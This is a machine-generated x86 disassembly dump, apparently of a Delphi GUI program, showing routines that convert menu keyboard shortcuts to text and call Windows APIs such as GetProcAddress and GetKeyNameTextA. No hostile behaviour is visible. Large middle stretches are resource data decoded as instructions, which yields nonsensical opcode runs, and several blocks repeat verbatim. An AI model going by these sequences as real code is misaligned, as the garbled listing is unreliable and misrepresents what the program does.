mov eax ebx
call sub_456f90
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_456f90
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458149
mov eax [ ebp - 0x4 ]
call sub_403154
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
jmp r-xdata
sub_4581b0
push ebx
push esi
call sub_403508
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403144
test bl bl
jle r-xdata
mov edx esi
call sub_457920
pop esi
pop ebx
retn
mov eax esi
call sub_4034f0
sub_4581fc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_458221
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458228
retn
sub_458834
mov edx 0xc2dc0045
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
adc [ eax ] al
aas
add [ eax ] al
inc [ ebx + edi * 4 ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x72470a00
outsd
jne r-xdata
adc [ eax ] al
cmp eax 0x2cff0000
rol [ ebp ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x61 ] edx
imul ebp [ fs : edi + 0x49 ] 0xec6d6574
dec ecx
outsb
js r-xdata
cwde
add [ eax ] al
inc ebx
jne r-xdata
inc eax
add [ edx ] bh
add [ eax ] al
inc [ eax + 0x10045bc ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
jne r-xdata
push esi
inc ecx
add [ eax + eax ] dl
call [ eax + eax ]
[ ebx + eax * 8 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
dec eax
insb
jo r-xdata
inc ecx
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
[ eax + 0x7c0045bb ]
js r-xdata
je r-xdata
dec ecx
outsb
js r-xdata
outsd
outsb
je r-xdata
adc [ edx ] al
cwde
xor eax [ eax ]
nop
ja r-xdata
pop esp
retn
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
cld
retn 0x45
adc [ eax ] al
cmp [ eax ] eax
add bh bh
outsd
dec ecx
je r-xdata
add [ esi - 0x76 ] bh
je r-xdata
imul esp [ ebx + 0x6b ] r-xdata
nop
add [ eax ] al
call [ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0015 ] al
outsb
inc esp
jb r-xdata
push esi
inc ecx
add [ eax ] ah
add bh bh
xchg esp eax
mov ebx 0xc35c0045
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
insd
in al dx
xor eax [ eax ]
insd
or [ ebp + eax * 2 + 0xa000 ] al
jmp [ eax + 0x1ff0000 ]
add [ eax ] al
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
nop
add [ ebp ] 0xffffff98
add [ eax ] al
[ eax + 0x1ff0000 ]
inc ebp
add [ edx + 0x5800458a ] dl
add [ eax ] al
add [ esp + ebp * 2 ] ah
add [ 0x654d6e4f ] cl
popad
jae r-xdata
je r-xdata
cmp al 0x14
jb r-xdata
insb
mov al [ ebp ]
pushfd
mov al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jle r-xdata
insd
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
int 0x45
add [ eax - 0x2a ] bh
inc ebp
add [ esi + ecx * 8 - 0x2957ffbb ] bh
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
inc ebp
add [ esp + edx ] ch
inc edx
dec ecx
je r-xdata
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
adc al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
lea eax [ eax ]
xor [ edx + 0x45 ] cl
sub_458b15
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax - 0x32 ] ch
inc ebp
add [ eax + 0x4400418c ] dl
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
nop
salc
inc ebp
add [ edi + edx * 8 ] ch
inc ebp
add [ esp + edx ] ch
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add ah cl
int 0x45
add [ eax - 0x2a ] bh
inc ebp
add [ eax - 0x24 ] ch
inc ebp
add [ ebx + ebx * 8 + 0x54090045 ] ch
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shl [ eax - 0x75 ] 0x45
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x24756e65
mov eax [ ebp ]
cwde
mov al [ ebp ]
or eax [ eax ]
add eax 0x756e654d
jae r-xdata
add [ ebx + ebx * 8 + 0x45 ] bl
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add al al
test [ ebp ] al
dec esp
fild [ ebp ]
pop esp
fild [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
insb
dec eax
outsd
je r-xdata
jns r-xdata
inc ebp
add [ eax ] cl
add bh bh
and al 0x6c
rol [ ebp + eax * 2 + 0x45db6c00 ] 0x0
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
dec [ ebx + ebx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x75410900
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
push [ ebp + edx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
inc eax
add [ ecx ] al
add bh bh
call 0x145d252
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
dec ebp
jb r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
inc ebx
push 0x65676e61
nop
mov esp 0x300458c
andps xmm2 [ eax + 0x6f ]
jo r-xdata
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
mov esp 0x30004155
add [ eax ] al
call esp
fiadd [ ebp ]
int3
cmp al 0x8d
inc ebp
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
jo r-xdata
outsb
je r-xdata
ja r-xdata
cmp [ ebp + 0x6d0d0045 ] cl
popad
dec esp
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x600458c ] bh
imul eax [ ecx + ebp * 2 + 0x4d ] 0xcc65646f
add [ ebp ] 0x50
add [ eax ] al
call [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
inc ecx
add [ eax ] al
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
mov eax 0x600458c
lea eax [ ebp ]
lea eax [ eax ]
or [ esi + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
mov es [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
mov es [ ebp ]
js r-xdata
outsd
cld
mov [ ebp ] es
add ecx [ esp + edx * 2 ]
push esp
jb r-xdata
dec ebp
outsb
jne r-xdata
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
add [ eax ] cl
xor [ eax ] eax
shl dl 0x45
add [ eax + 0x4400418c ] dl
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
nop
salc
inc ebp
add [ edi + edx * 8 ] ch
inc ebp
add [ esp + edx ] ch
inc edx
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ edx + 0x45 ] cl
add [ eax - 0x2a ] bh
inc ebp
add [ esi + ecx * 8 - 0x2957ffbb ] bh
inc ebp
add ah dh
loop r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
add [ eax ] al
in al 0x89
inc ebp
add [ edi + edx ] bh
je r-xdata
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
or [ eax + 0x61 ] dh
jo r-xdata
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
rol [ ebp + eax * 2 + 0x45db4c00 ] 0x0
pop esp
fild [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x540a0045 ] ch
push eax
outsd
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
outsd
insd
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x45 ] cl
add [ eax ] bh
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9865646f
dec eax
outsd
je r-xdata
add [ ebx + ebx * 8 + 0x45 ] ch
add [ ebx + ebx * 8 + 0x45 ] bh
jo r-xdata
outsd
movsb [ edi ] [ esi ]
lea eax [ ebp ]
push es
je r-xdata
jne r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
mov [ ebp ] es
or eax 0x69526274
push 0x74754274
je r-xdata
add [ eax ] al
[ ecx ]
add [ eax ] dl
jecxz r-xdata
jns r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ ebx + ebx * 8 + 0x45 ] cl
add [ ebx + ebx * 8 + 0x45 ] bl
outsb
jne r-xdata
je r-xdata
lea eax [ ebp ]
add ecx [ edi ]
adc [ edx ] al
cwde
xor eax [ eax ]
xor eax [ eax ]
nop
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x45 ] bl
add [ eax ] al
je r-xdata
outsd
dec esp
push cs
push esp
dec ebp
outsb
jne r-xdata
add [ esi ] al
je r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jo r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push esi
inc ecx
add [ eax ] cl
jecxz r-xdata
cwde
rol [ ebp + eax * 2 + 0x45db6c00 ] 0x0
jl r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
or al [ eax ]
or eax 0x756e654d
inc ecx
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
inc edx
add [ eax - 0x6fffbfcd ] dl
cmp al 0x17
pop esp
mov es [ ebp ]
pop es
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ ecx ] al
inc ebp
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
mov ah 0xd5
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
xor al 0x84
inc ecx
add al bl
test [ ecx ] eax
sbb [ eax - 0x7b77ffbf ] cl
inc ecx
add [ eax * 4 - 0x233bffbf ] al
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
and al 0x6c
inc ebp
add [ eax ] cl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push ebp
inc ecx
add [ eax ] dh
add [ eax ] al
call esp
fiadd [ ebp ]
int3
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax - 0x7bffbea4 ] cl
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
outsb
int3
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x91
jo r-xdata
inc ebx
push 0x65676e61
add al 0x57
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
mov [ ebp ] es
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ 0x756e654d ] al
jae r-xdata
mov es [ ebp ]
cwde
mov al [ ebp ]
adc [ eax ] al
add eax 0x756e654d
cld
fwait
inc edx
add [ eax - 0x64 ] ah
inc edx
add [ eax - 0x64 ] al
inc edx
add [ esp + ebx * 4 ] ch
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
inc ebp
add [ eax ] cl
add [ eax ] al
add [ edx + ebx * 4 + 0x33840042 ] bh
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
imul esi [ ebx + 0x74 ] 0x45911890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 4 ] ah
je r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
shr [ eax + edx * 4 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
nop
inc ebp
add [ eax + eax ] dl
add [ eax ] al
mov [ ecx + eax * 2 ] bl
test [ ebx ] dh
inc eax
add [ eax - 0x6bffbfcd ] dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x6000458c ] bh
add [ eax ] al
jmp [ eax ]
test ebx ebx
je r-xdata
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44e008
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_458e84
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
rol [ ebp + eax * 2 + 0x45db4c00 ] 0x0
pop esp
fild [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9865646f
dec eax
outsd
je r-xdata
add [ eax ] al
[ ecx ]
add [ eax ] dl
jecxz r-xdata
jns r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
push esi
inc ecx
add [ eax ] cl
jecxz r-xdata
cwde
rol [ ebp + eax * 2 + 0x45db6c00 ] 0x0
jl r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebp
add [ ecx ] al
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
xor al 0x84
inc ecx
add al bl
test [ ecx ] eax
sbb [ eax - 0x7b77ffbf ] cl
inc ecx
add [ eax * 4 - 0x233bffbf ] al
inc ebp
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ eax ] al
add [ eax + eax ] cl
push cs
push eax
popad
jb r-xdata
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
mov ah 0xd5
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax - 0x7bffbea4 ] cl
xor eax [ eax ]
nop
xor eax [ eax ]
xchg esp eax
outsb
int3
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
and al 0x6c
inc ebp
add [ eax ] cl
add bh bh
or al [ eax ]
or eax 0x756e654d
inc ecx
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
cld
fwait
inc edx
add [ eax - 0x64 ] ah
inc edx
add [ eax - 0x64 ] al
inc edx
add [ esp + ebx * 4 ] ch
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x45911890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 4 ] ah
inc ebp
add [ eax ] cl
add [ eax ] al
add [ edx + ebx * 4 + 0x33840042 ] bh
inc eax
add [ eax - 0x6bffbfcd ] dl
xor eax [ eax ]
cwde
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x91
jo r-xdata
inc ebx
push 0x65676e61
add al 0x57
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
mov [ ebp ] es
push 0x68ff0000
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
xor eax [ eax ]
cwde
xor eax [ eax ]
shr [ eax + edx * 4 + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
nop
inc ebp
add [ eax + eax ] dl
add [ eax ] al
mov [ ecx + eax * 2 ] bl
test [ ebx ] dh
inc eax
add [ eax - 0x6bffbfcd ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x75411100
je r-xdata
push ebp
inc ecx
add [ eax ] dh
add [ eax ] al
call esp
fiadd [ ebp ]
int3
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44e008
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_459164
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_448698
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_44e008
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_4591bc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_4591f4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f50
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4041c0
sub_459248
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_459431
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fe8
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404138
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fe8
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403fe8
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404138
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404138
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f50
mov eax esi
call sub_403f50
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403fe8
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_408080
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40425c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_4591f4
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404218
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403fe8
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404218
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404218
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404218
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459438
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f74
retn
sub_45944c
push ebx
push esi
push edi
